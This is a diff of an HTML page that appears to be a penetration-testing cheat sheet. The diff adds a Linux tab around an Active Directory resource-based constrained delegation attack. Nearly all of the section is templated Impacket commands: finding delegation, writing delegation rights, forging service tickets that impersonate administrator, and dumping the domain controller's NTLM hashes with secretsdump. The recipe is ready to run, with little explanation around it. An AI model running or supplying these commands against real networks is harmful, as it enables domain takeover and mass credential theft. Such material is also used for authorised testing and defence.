@@ -200,12 +200,18 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-rbcd-attack">Abuse #1: RBCD Attack</h3>
-<h4 id="1-find-delegation">1. Find delegation</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-find-delegation">1. Find delegation</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-findDelegation <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-getST -spn &lt;SERVICE&gt;/&lt;DC&gt; -impersonate administrator <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -hashes :&lt;HASH&gt; -self
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check forwardable flag</span>
 </span></span><span class="line"><span class="cl">describeTicket.py &lt;TICKET_1&gt;.ccache
-</span></span></code></pre></div><h4 id="2-rbcd">2. RBCD</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-rbcd">2. RBCD</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add delegation</span>
 </span></span><span class="line"><span class="cl">impacket-rbcd <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -hashes :&lt;HASH&gt; -k -delegate-from &lt;USERNAME&gt; -delegate-to &lt;TARGET_1&gt; -action write -dc-ip &lt;DC&gt; -use-ldaps
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
@@ -214,13 +220,19 @@
 </span></span><span class="line"><span class="cl">impacket-getST <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;&#39;</span> -spn &lt;SERVICE&gt;/&lt;DC&gt; -impersonate &lt;TARGET_2&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check forwardable flag</span>
 </span></span><span class="line"><span class="cl">describeTicket.py &lt;TICKET_2&gt;.ccache
-</span></span></code></pre></div><h4 id="3-impersonate">3. Impersonate</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-impersonate">3. Impersonate</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-getST -spn &lt;SERVICE&gt;/&lt;DC&gt; -impersonate &lt;TARGET_2&gt; <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;TARGET_1&gt;&#39;</span> -hashes :&lt;HASH&gt; -additional-ticket &lt;TICKET_2&gt;.ccache
-</span></span></code></pre></div><h4 id="4-secrets-dump">4. Secrets Dump</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-secrets-dump">4. Secrets Dump</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Import ticket</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;&lt;TICKET_2&gt;.ccache&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -no-pass -k &lt;DC&gt; -just-dc-ntlm
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
